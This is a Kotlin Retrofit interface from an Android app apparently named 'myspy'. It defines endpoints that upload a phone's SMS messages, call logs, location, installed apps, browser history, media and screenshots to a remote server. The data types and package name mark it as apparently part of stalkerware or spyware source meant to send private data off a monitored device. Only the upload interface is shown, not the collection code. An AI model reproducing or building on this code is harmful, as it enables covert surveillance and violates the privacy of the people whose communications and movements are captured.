package com.myspy.android.data.remote.api

import com.myspy.android.data.remote.models.*
import retrofit2.Response
import retrofit2.http.*

/**
 * API Service Interface
 * @author Michael KOJDL
 * @version 1.0.0
 */
interface ApiService {

    @POST("register/")
    suspend fun registerDevice(
        @Body request: RegisterDeviceRequest
    ): Response<RegisterDeviceResponse>

    @POST("sms/")
    suspend fun uploadSms(
        @Body data: List<SmsData>
    ): Response<ApiResponse>

    @POST("calls/")
    suspend fun uploadCalls(
        @Body data: List<CallData>
    ): Response<ApiResponse>

    @POST("location/")
    suspend fun uploadLocation(
        @Body data: List<LocationData>
    ): Response<ApiResponse>

    @POST("apps/")
    suspend fun uploadApps(
        @Body data: List<AppData>
    ): Response<ApiResponse>

    @POST("browser-history/")
    suspend fun uploadBrowserHistory(
        @Body data: List<BrowserHistoryData>
    ): Response<ApiResponse>

    @POST("media/")
    suspend fun uploadMedia(
        @Body data: List<MediaData>
    ): Response<ApiResponse>

    @POST("screenshots/")
    suspend fun uploadScreenshots(
        @Body data: List<ScreenshotData>
    ): Response<ApiResponse>

    @GET("status/")
    suspend fun getStatus(): Response<ApiResponse>
}
